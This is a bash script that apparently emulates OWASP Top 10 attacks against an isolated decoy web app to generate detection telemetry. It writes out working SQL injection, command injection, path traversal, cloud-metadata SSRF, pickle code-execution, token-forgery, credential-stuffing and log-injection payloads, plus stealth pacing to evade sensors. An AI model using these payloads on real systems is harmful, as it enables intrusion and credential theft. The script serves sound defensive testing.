#!/bin/bash
#
# run-owasp-top10.sh — OWASP Top 10:2025 application-layer scenarios.
#
# Purpose: generate REAL application-layer telemetry and artefacts for WAF /
# API / CDR / runtime sensors. Each step sends real requests to the decoy web
# app (web-portal), which really executes the vulnerable code path (SQL, a
# shell, an outbound fetch, a file read, a pickle load...). Every payload is
# inert and DECOY-tagged, and only touches decoy data in an isolated container.
# This pairs with the ATT&CK scenarios: those test host/cloud behaviour, these
# test application attacks.
#
# Usage (inside ops-console, after bootstrap):
#   bash playbooks/run-owasp-top10.sh            # all categories
#   bash playbooks/run-owasp-top10.sh A01 A05    # selected categories
# Honours the stealth profile (STEALTH=...): request pacing, volume, client tool
# and user agent change; the vulnerabilities exercised do not.
#
# Ground truth (what the app really did) is written by the app to
# results/webapp_events.jsonl; this script's own steps go to
# results/stealth_timeline.jsonl and owasp_<session>.log.
#
#   A01 Broken Access Control        IDOR, unauthenticated admin export, path traversal, SSRF
#   A02 Security Misconfiguration    debug endpoint, exposed .env, directory listing
#   A03 Software Supply Chain        fetch + load of an unsigned package
#   A04 Cryptographic Failures       cleartext login, unsalted MD5, forged session token
#   A05 Injection                    SQL injection, command injection, stored XSS
#   A06 Insecure Design              coupon abuse, negative quantity, reset-code brute force
#   A07 Authentication Failures      default credentials, credential stuffing, no lockout
#   A08 Software/Data Integrity      unsafe pickle deserialization, unsigned update
#   A09 Logging & Alerting Failures  actions the app never logs, log injection
#   A10 Exceptional Conditions       stack-trace leak, fail-open authorization
set -u

source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"

WEB_HOST="${WEB_HOST:-web-portal}"
WEB_PORT="${WEB_PORT:-8080}"
C2_HOST="${C2_HOST:-control-api}"
C2_PORT="${C2_PORT:-8443}"
RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/owasp_${SESSION}.log"
BASE="http://${WEB_HOST}:${WEB_PORT}"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

# URL-encode a string (payloads contain quotes, spaces, semicolons)
enc() { python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$1"; }
# one request: req LABEL METHOD PATH [DATA] [HEADER]  -> prints a short result line
req() {
    local label="$1" method="$2" path="$3" data="${4:-}" hdr="${5:-}" out
    out="$(st_http "$method" "${BASE}${path}" "$data" "$hdr")"
    say "  ${label}: $(echo "$out" | tr '\n' ' ' | cut -c1-110)"
    # pace requests per the stealth profile (0s at noisy)
    if [ "$ST_DNS_DELAY_MAX" -gt 0 ]; then st_sleep "$ST_DNS_DELAY_MIN" "$ST_DNS_DELAY_MAX" >/dev/null; fi
}
mark() { st_mark "OWASP-$1" "$2"; }

# volume for burst-style scenarios, scaled down as stealth rises
case "$ST_TIMING" in 0) BURST=30 ;; 1) BURST=15 ;; 2) BURST=8 ;; *) BURST=4 ;; esac

say "Northline :: OWASP Top 10:2025 emulation :: session=$SESSION target=${BASE}"
say "$(st_banner) burst=${BURST}"

if [ -z "$(ACT_OFF=1 st_http GET "${BASE}/health")" ]; then
    say "!! web-portal not reachable at ${BASE} — is the web-portal service up?"
    exit 1
fi

WANT=("$@"); [ ${#WANT[@]} -gt 0 ] || WANT=(A01 A02 A03 A04 A05 A06 A07 A08 A09 A10)
wanted() { local c; for c in "${WANT[@]}"; do [ "$c" = "$1" ] && return 0; done; return 1; }

a01() {
    step "A01 Broken Access Control"
    mark A01 idor; for id in 1 2 3; do req "IDOR user $id (no auth, any id)" GET "/api/users/$id"; done
    mark A01 admin-export; req "unauthenticated admin export" GET "/admin/export"
    mark A01 path-traversal; req "path traversal -> /etc/passwd" GET "/files?name=$(enc '../../../../etc/passwd')"
    mark A01 ssrf
    req "SSRF -> decoy IMDS role list" GET "/fetch?url=$(enc 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')"
    req "SSRF -> decoy IMDS credentials" GET "/fetch?url=$(enc 'http://169.254.169.254/latest/meta-data/iam/security-credentials/northline-decoy-role')"
    req "SSRF -> internal service (control-api)" GET "/fetch?url=$(enc "http://${C2_HOST}:${C2_PORT}/logging/status")"
}
a02() {
    step "A02 Security Misconfiguration"
    mark A02 debug; req "debug endpoint (env, argv, pid)" GET "/debug"
    mark A02 dotenv; req "exposed .env file" GET "/.env"
    mark A02 dir-listing; req "directory listing /static/" GET "/static/"
}
a03() {
    step "A03 Software Supply Chain Failures"
    mark A03 unsigned-package
    req "install unsigned package from arbitrary URL" POST "/plugins/install" "{\"url\":\"http://${C2_HOST}:${C2_PORT}/pkg/northline-utils.py\"}"
}
a04() {
    step "A04 Cryptographic Failures"
    mark A04 cleartext-login; req "login over plain HTTP (cleartext credentials)" POST "/login" '{"username":"alice","password":"alice123"}'
    mark A04 weak-hash-dump; req "MD5 password hashes via export" GET "/admin/export"
    mark A04 forged-token
    FORGED="$(python3 -c 'import base64,hashlib; print(base64.urlsafe_b64encode(("mallory:admin:"+hashlib.md5(b"mallory").hexdigest()).encode()).decode())')"
    req "forged admin session token accepted" GET "/api/me" "" "Cookie: token=${FORGED}"
}
a05() {
    step "A05 Injection"
    mark A05 sqli
    req "SQLi tautology" GET "/search?q=$(enc "' OR '1'='1")"
    req "SQLi UNION over decoy users" GET "/search?q=$(enc "x' UNION SELECT id,name||':'||pw_md5,0 FROM users--")"
    mark A05 cmdi
    req "command injection (marker only)" GET "/lookup?host=$(enc 'localhost; echo DECOY-CMDI-MARKER; id')"
    mark A05 xss
    req "stored XSS (inert payload)" POST "/comments" '{"author":"decoy","body":"<script>/*DECOY-XSS*/</script>"}'
    req "read back comments (payload served unescaped)" GET "/comments"
}
a06() {
    step "A06 Insecure Design"
    mark A06 coupon-abuse; for i in $(seq 1 "$BURST"); do req "coupon redemption #$i" POST "/api/coupon"; done
    mark A06 negative-qty; req "negative quantity order" POST "/api/order" '{"qty":-5}'
    mark A06 reset-bruteforce
    req "request password reset" POST "/reset?user=alice"
    local n; n=$(( BURST * 3 ))
    for i in $(seq 0 "$n"); do req "reset code guess $(printf '%04d' "$i")" GET "/reset?user=alice&code=$(printf '%04d' "$i")"; done
}
a07() {
    step "A07 Authentication Failures"
    mark A07 default-creds; req "default credentials admin/admin" POST "/login" '{"username":"admin","password":"admin"}'
    mark A07 credential-stuffing
    for i in $(seq 1 "$BURST"); do req "stuffing attempt #$i" POST "/login" "{\"username\":\"alice\",\"password\":\"DECOY-guess-$i\"}"; done
    mark A07 session-fixation; req "session fixation (attacker-chosen sid)" POST "/login?sid=DECOY-FIXED-SESSION" '{"username":"bob","password":"bob456"}'
}
a08() {
    step "A08 Software or Data Integrity Failures"
    mark A08 unsafe-pickle
    local pk="/tmp/decoy-import-${SESSION}.pkl"
    python3 - "$pk" <<'PY'
import os, pickle, sys
class DecoyPayload:
    # inert: appends a marker line, nothing else
    def __reduce__(self):
        return (os.system, ('echo DECOY-PICKLE-EXECUTED >> /home/root/results/webapp_pickle_marker.txt',))
open(sys.argv[1], "wb").write(pickle.dumps(DecoyPayload()))
PY
    req "import pickled object (inert marker payload)" POST "/api/import" "@${pk}"
    rm -f "$pk"
    mark A08 unsigned-update; req "unsigned update accepted" POST "/api/update" '{"version":"9.9.9-decoy","signature":"INVALID"}'
}
a09() {
    step "A09 Security Logging and Alerting Failures"
    mark A09 unlogged-activity
    req "failed login (the app logs nothing)" POST "/login" '{"username":"admin","password":"wrong"}'
    req "unauthenticated admin export (the app logs nothing)" GET "/admin/export"
    mark A09 log-injection
    req "log injection: CRLF in comment author forges an admin log line" POST "/comments" '{"author":"decoy\n2026-01-01T00:00:00Z login ok user=admin DECOY-FORGED-LOG-LINE","body":"x"}'
    req "read the app audit log (note what is missing)" GET "/admin/audit-log"
}
a10() {
    step "A10 Mishandling of Exceptional Conditions"
    mark A10 stack-trace; req "divide by zero -> stack trace" GET "/api/divide?a=1&b=0"
    req "non-numeric input -> stack trace" GET "/api/divide?a=DECOY&b=1"
    mark A10 fail-open; req "authz check for unknown user (fails open)" GET "/api/authz?user=nobody-decoy"
    req "authz check for known low-priv user" GET "/api/authz?user=alice"
}

for c in A01 A02 A03 A04 A05 A06 A07 A08 A09 A10; do
    wanted "$c" && "${c,,}"
done

step "Done — OWASP Top 10 emulation complete."
say "artifacts: $LOG  (ground truth: results/webapp_events.jsonl, results/webapp_app.log)"

act_summary
